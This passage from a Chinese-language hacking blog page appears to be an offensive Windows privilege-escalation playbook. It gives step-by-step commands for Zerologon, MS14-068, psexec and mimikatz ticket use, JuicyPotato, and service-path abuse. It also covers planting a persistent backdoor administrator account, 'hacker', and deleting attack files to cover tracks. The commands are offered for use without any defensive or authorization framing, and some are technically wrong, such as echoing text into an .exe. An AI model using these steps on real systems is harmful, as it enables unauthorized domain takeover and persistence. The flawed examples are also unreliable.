+<p>使用解密密码登录：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>psexec.py domain.com/domain_admin:解密密码@域控制器
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：获得域管理员权限</p>
+<hr>
+<h3 id="3-cve-2020-1472提权zerologon">3. CVE-2020-1472提权（Zerologon）<a hidden class="anchor" aria-hidden="true" href="#3-cve-2020-1472提权zerologon">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>域控制器运行Windows Server 2008 R2/2012/2012 R2/2016/2019</li>
+<li>未安装2020年8月的补丁</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>使用工具攻击：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>python CVE-2020-1472.py 域控制器IP 域名 域用户 密码
+</span></span></code></pre></div></li>
+<li>
+<p>获取域管理员权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>psexec.py domain.com/domain_admin:密码@域控制器
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：获得域管理员权限</p>
+<hr>
+<h3 id="4-ms14-068提权">4. MS14-068提权<a hidden class="anchor" aria-hidden="true" href="#4-ms14-068提权">#</a></h3>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>系统已知SID</li>
+<li>域用户有密码</li>
+</ul>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>获取域用户SID：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>whoami /user
+</span></span></code></pre></div></li>
+<li>
+<p>生成Kerberos票据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>MS14-068.exe -u <span style="color:#e6db74">&#34;domain_user@domain.com&#34;</span> -p <span style="color:#e6db74">&#34;password&#34;</span> -s <span style="color:#e6db74">&#34;S-1-5-21-...&#34;</span> -d <span style="color:#e6db74">&#34;域控制器IP&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>使用票据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>mimikatz # kerberos::ptc <span style="color:#e6db74">&#34;TGT_domain_user@domain.ccache&#34;</span>
+</span></span><span style="display:flex;"><span>psexec.py domain.com/domain_user@域控制器
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：获得域控制器访问权限</p>
+<hr>
+<h2 id="三提权前必备检查">三、提权前必备检查<a hidden class="anchor" aria-hidden="true" href="#三提权前必备检查">#</a></h2>
+<p>在尝试提权前，先运行以下命令检查：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>whoami /priv          :: 查看当前权限
+</span></span><span style="display:flex;"><span>systeminfo            :: 查看系统信息
+</span></span><span style="display:flex;"><span>net user              :: 查看所有用户
+</span></span><span style="display:flex;"><span>net localgroup administrators :: 查看管理员组成员
+</span></span><span style="display:flex;"><span>sc query              :: 查看所有服务
+</span></span><span style="display:flex;"><span>icacls C:\            :: 检查C盘权限
+</span></span><span style="display:flex;"><span>winpeas.exe quiet notcolor serviceinfo :: 自动检查提权点
+</span></span></code></pre></div><h2 id="四提权成功后">四、提权成功后<a hidden class="anchor" aria-hidden="true" href="#四提权成功后">#</a></h2>
+<ol>
+<li>
+<p><strong>创建持久化账户</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net user hacker P@ssw0rd /add
+</span></span><span style="display:flex;"><span>net localgroup administrators hacker /add
+</span></span></code></pre></div></li>
+<li>
+<p><strong>清理痕迹</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">del</span> evil.bat
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> add.msi
+</span></span></code></pre></div></li>
+<li>
+<p><strong>保持权限</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>mimikatz # privilege::debug
+</span></span><span style="display:flex;"><span>mimikatz # token::elevate
+</span></span></code></pre></div></li>
+</ol>
+<h2 id="五提权小技巧">五、提权小技巧<a hidden class="anchor" aria-hidden="true" href="#五提权小技巧">#</a></h2>
+<ol>
+<li><strong>先检查</strong>：<code>whoami /priv</code>、<code>sc query</code>、<code>icacls C:\</code></li>
+<li><strong>再利用</strong>：根据检查结果，选择最简单的提权方式</li>
+<li><strong>最后验证</strong>：<code>net localgroup administrators</code>，看是否成功</li>
+</ol>
+<h2 id="附录提权方式快速对照表">附录：提权方式快速对照表<a hidden class="anchor" aria-hidden="true" href="#附录提权方式快速对照表">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>提权方式</th>
+          <th>适用环境</th>
+          <th>操作难度</th>
+          <th>成功率</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>AlwaysInstallElevated</td>
+          <td>工作组/域</td>
+          <td>★☆☆☆☆</td>
+          <td>★★★★★</td>
+      </tr>
+      <tr>
+          <td>服务权限配置错误</td>
+          <td>工作组/域</td>
+          <td>★★☆☆☆</td>
+          <td>★★★★☆</td>
+      </tr>
+      <tr>
+          <td>未引用的服务路径</td>
+          <td>工作组</td>
+          <td>★★☆☆☆</td>
+          <td>★★★★☆</td>
+      </tr>
+      <tr>
+          <td>DLL劫持</td>
+          <td>工作组</td>
+          <td>★★★☆☆</td>
+          <td>★★★☆☆</td>
+      </tr>
+      <tr>
+          <td>Serv-U提权</td>
+          <td>工作组</td>
+          <td>★★★☆☆</td>
+          <td>★★★☆☆</td>
+      </tr>
+      <tr>
+          <td>GPP组策略提权</td>
+          <td>域环境</td>
+          <td>★★★★☆</td>
+          <td>★★★★☆</td>
+      </tr>
+      <tr>
+          <td>CVE-2020-1472</td>
+          <td>域环境</td>
+          <td>★★★★☆</td>
+          <td>★★★★☆</td>
+      </tr>
+      <tr>
+          <td>NTLM中继</td>
+          <td>域环境</td>
+          <td>★★★★☆</td>
+          <td>★★★★☆</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="根据命令结果选择提权方式的实战指南">根据命令结果选择提权方式的实战指南<a hidden class="anchor" aria-hidden="true" href="#根据命令结果选择提权方式的实战指南">#</a></h1>
+<h2 id="一命令结果分析与提权方式选择">一、命令结果分析与提权方式选择<a hidden class="anchor" aria-hidden="true" href="#一命令结果分析与提权方式选择">#</a></h2>
+<h3 id="1-whoami-priv-结果分析">1. <code>whoami /priv</code> 结果分析<a hidden class="anchor" aria-hidden="true" href="#1-whoami-priv-结果分析">#</a></h3>
+<table>
+  <thead>
+      <tr>
+          <th>权限名称</th>
+          <th>说明</th>
+          <th>对应提权方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>SeImpersonatePrivilege</code></td>
+          <td>可以模拟其他用户身份</td>
+          <td><strong>土豆家族提权</strong> (JuicyPotato/RoguePotato)</td>
+      </tr>
+      <tr>
+          <td><code>SeAssignPrimaryTokenPrivilege</code></td>
+          <td>可以分配主令牌</td>
+          <td><strong>土豆家族提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>SeServiceLogonRight</code></td>
+          <td>可以作为服务登录</td>
+          <td><strong>服务提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>SeBackupPrivilege</code></td>
+          <td>可以备份文件</td>
+          <td><strong>备份提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>SeTakeOwnershipPrivilege</code></td>
+          <td>可以获取文件所有权</td>
+          <td><strong>文件所有权提权</strong></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>✅ <strong>小提示</strong>：如果看到<code>SeImpersonatePrivilege</code>，这是最简单的提权方式之一。</p>
+</blockquote>
+<hr>
+<h3 id="2-sc-query-结果分析">2. <code>sc query</code> 结果分析<a hidden class="anchor" aria-hidden="true" href="#2-sc-query-结果分析">#</a></h3>
+<p><strong>重点检查</strong>：服务名称、状态、路径</p>
+<table>
+  <thead>
+      <tr>
+          <th>服务状态</th>
+          <th>路径特征</th>
+          <th>提权方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>RUNNING</code></td>
+          <td>路径包含空格且无引号</td>
+          <td><strong>未引用服务路径提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>RUNNING</code></td>
+          <td>路径权限可写</td>
+          <td><strong>服务权限配置错误提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>RUNNING</code></td>
+          <td>以SYSTEM身份运行</td>
+          <td><strong>服务提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>STOPPED</code></td>
+          <td>有修改权限</td>
+          <td><strong>服务提权</strong></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>✅ <strong>小提示</strong>：运行<code>sc qc 服务名</code>查看具体路径，如<code>sc qc Spooler</code></p>
+</blockquote>
+<hr>
+<h3 id="3-icacls-c-结果分析">3. <code>icacls C:\</code> 结果分析<a hidden class="anchor" aria-hidden="true" href="#3-icacls-c-结果分析">#</a></h3>
+<table>
+  <thead>
+      <tr>
+          <th>权限配置</th>
+          <th>说明</th>
+          <th>提权方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>Everyone:(F)</code></td>
+          <td>Everyone有完全控制权限</td>
+          <td><strong>系统路径配置问题提权</strong></td>
+      </tr>
+      <tr>
+          <td><code>BUILTIN\Users:(OI)(CI)(RX)</code></td>
+          <td>用户有读取权限</td>
+          <td><strong>DLL劫持</strong></td>
+      </tr>
+      <tr>
+          <td><code>NT AUTHORITY\Authenticated Users:(AD)</code></td>
+          <td>认证用户有添加权限</td>
+          <td><strong>计划任务提权</strong></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>✅ <strong>小提示</strong>：如果看到<code>Everyone:(F)</code>，说明C盘权限非常宽松，可以写入。</p>
+</blockquote>
+<hr>
+<h2 id="二提权方式选择流程图">二、提权方式选择流程图<a hidden class="anchor" aria-hidden="true" href="#二提权方式选择流程图">#</a></h2>
+<p><img alt="提权" loading="lazy" src="./images.png"></p>
+<hr>
+<h2 id="三实战案例分析">三、实战案例分析<a hidden class="anchor" aria-hidden="true" href="#三实战案例分析">#</a></h2>
+<h3 id="案例1whoami-priv-显示有seimpersonateprivilege">案例1：<code>whoami /priv</code> 显示有<code>SeImpersonatePrivilege</code><a hidden class="anchor" aria-hidden="true" href="#案例1whoami-priv-显示有seimpersonateprivilege">#</a></h3>
+<p><strong>提权方式</strong>：土豆家族提权（JuicyPotato）</p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>
+<p>下载JuicyPotato工具</p>
+</li>
+<li>
+<p>运行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>JuicyPotato.exe -p <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c whoami&#34;</span>
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：输出<code>nt authority\system</code></p>
+<hr>
+<h3 id="案例2sc-query-显示有服务路径包含空格">案例2：<code>sc query</code> 显示有服务路径包含空格<a hidden class="anchor" aria-hidden="true" href="#案例2sc-query-显示有服务路径包含空格">#</a></h3>
+<p><strong>服务信息</strong>：</p>
+<pre tabindex="0"><code>SERVICE_NAME: Spooler
+DISPLAY_NAME: Print Spooler
+BINARY_PATH_NAME: C:\Program Files\Print Spooler\spooler.exe
+</code></pre><p><strong>提权方式</strong>：未引用服务路径提权</p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>
+<p>创建恶意文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net user hacker P@ssw0rd /add &gt; C:\Program Files\Print Spooler\spooler.exe
+</span></span></code></pre></div></li>
+<li>
+<p>修改服务路径：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc config Spooler binpath= <span style="color:#e6db74">&#34;C:\Program Files\Print Spooler\spooler.exe&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>重启服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net stop Spooler
+</span></span><span style="display:flex;"><span>net start Spooler
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>hacker</code>账户被添加为管理员</p>
+<hr>
+<h3 id="案例3icacls-c-显示-everyonef">案例3：<code>icacls C:\</code> 显示 <code>Everyone:(F)</code><a hidden class="anchor" aria-hidden="true" href="#案例3icacls-c-显示-everyonef">#</a></h3>
+<p><strong>提权方式</strong>：系统路径配置问题提权</p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>
+<p>创建恶意批处理文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net user hacker P@ssw0rd /add &gt; C:\evil.bat
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net localgroup administrators hacker /add &gt;&gt; C:\evil.bat
+</span></span></code></pre></div></li>
+<li>
+<p>运行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\evil.bat
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>hacker</code>账户被添加为管理员</p>
+<hr>
+<h3 id="案例4sc-query-显示有服务权限配置错误">案例4：<code>sc query</code> 显示有服务权限配置错误<a hidden class="anchor" aria-hidden="true" href="#案例4sc-query-显示有服务权限配置错误">#</a></h3>
+<p><strong>服务信息</strong>：</p>
+<pre tabindex="0"><code>SERVICE_NAME: MyService
+DISPLAY_NAME: My Custom Service
+BINARY_PATH_NAME: C:\MyService\service.exe
+</code></pre><p><strong>提权方式</strong>：服务权限配置错误提权</p>
+<p><strong>步骤</strong>：</p>
+<ol>
+<li>
+<p>检查服务权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>icacls <span style="color:#e6db74">&#34;C:\MyService&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>如果显示<code>Everyone:(F)</code>，则：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> net user hacker P@ssw0rd /add &gt; C:\MyService\service.exe
+</span></span></code></pre></div></li>
+<li>
+<p>重启服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net stop MyService
+</span></span><span style="display:flex;"><span>net start MyService
+</span></span></code></pre></div></li>
+</ol>
+<p><strong>成功标志</strong>：<code>hacker</code>账户被添加为管理员</p>
+<hr>
+<h2 id="四提权方式优先级排序">四、提权方式优先级排序<a hidden class="anchor" aria-hidden="true" href="#四提权方式优先级排序">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>提权方式</th>
+          <th>操作难度</th>
+          <th>成功率</th>
+          <th>适用场景</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>土豆家族提权</strong></td>
+          <td>★☆☆☆☆</td>
+          <td>★★★★★</td>
+          <td>有SeImpersonatePrivilege权限</td>
+      </tr>
+      <tr>
+          <td><strong>系统路径配置问题</strong></td>
+          <td>★★☆☆☆</td>
+          <td>★★★★☆</td>
+          <td>Everyone有C盘完全控制权限</td>
+      </tr>
+      <tr>
+          <td><strong>服务权限配置错误</strong></td>
+          <td>★★☆☆☆</td>
+          <td>★★★★☆</td>
+          <td>服务路径权限可写</td>
+      </tr>
+      <tr>
+          <td><strong>未引用服务路径</strong></td>
+          <td>★★★☆☆</td>
+          <td>★★★☆☆</td>
+          <td>服务路径有空格且无引号</td>
+      </tr>
+      <tr>
+          <td><strong>DLL劫持</strong></td>
+          <td>★★★☆☆</td>
+          <td>★★★☆☆</td>
+          <td>目标程序路径可写</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="五提权前必做检查清单">五、提权前必做检查清单<a hidden class="anchor" aria-hidden="true" href="#五提权前必做检查清单">#</a></h2>
+<ol>
+<li>
+<p><strong>检查权限</strong>：<code>whoami /priv</code></p>
+<ul>
+<li>有<code>SeImpersonatePrivilege</code> → 优先尝试土豆家族提权</li>
+</ul>
+</li>
+<li>
+<p><strong>检查服务</strong>：<code>sc query</code></p>
+<ul>
+<li>找到运行中的服务 → 检查<code>sc qc 服务名</code></li>
+</ul>
+</li>
+<li>
+<p><strong>检查目录权限</strong>：<code>icacls C:\</code></p>
+<ul>
+<li>Everyone有<code>(F)</code> → 优先尝试系统路径提权</li>
+</ul>
+</li>
+<li>
+<p><strong>检查DLL路径</strong>：<code>where notepad</code></p>
+<ul>
+<li>找到程序路径 → 检查权限</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="六实战技巧">六、实战技巧<a hidden class="anchor" aria-hidden="true" href="#六实战技巧">#</a></h2>
+<ol>
+<li>
+<p><strong>快速检查</strong>：<code>winpeas.exe quiet notcolor serviceinfo</code></p>
+<ul>
+<li>自动检查所有提权点</li>
+</ul>
+</li>
+<li>
+<p><strong>验证提权</strong>：<code>whoami</code> 和 <code>net localgroup administrators</code></p>
+<ul>
+<li>确认是否获得管理员权限</li>
+</ul>
+</li>
+<li>
+<p><strong>保持权限</strong>：<code>net user hacker P@ssw0rd /add</code> + <code>net localgroup administrators hacker /add</code></p>
+<ul>
+<li>创建持久化管理员账户</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="总结提权三步">总结：提权三步<a hidden class="anchor" aria-hidden="true" href="#总结提权三步">#</a></h2>
+<ol>
+<li><strong>检查</strong>：<code>whoami /priv</code>、<code>sc query</code>、<code>icacls C:\</code></li>
+<li><strong>判断</strong>：根据结果选择最简单的提权方式</li>
+<li><strong>执行</strong>：按照对应方式执行提权命令</li>
+</ol>
+<blockquote>
+<p>提示**：提权成功后，**务必创建持久化账户（<code>net user hacker P@ssw0rd /add</code> + <code>net localgroup administrators hacker /add</code>），避免因会话结束而失去权限。</p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">H4ck3r Station</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
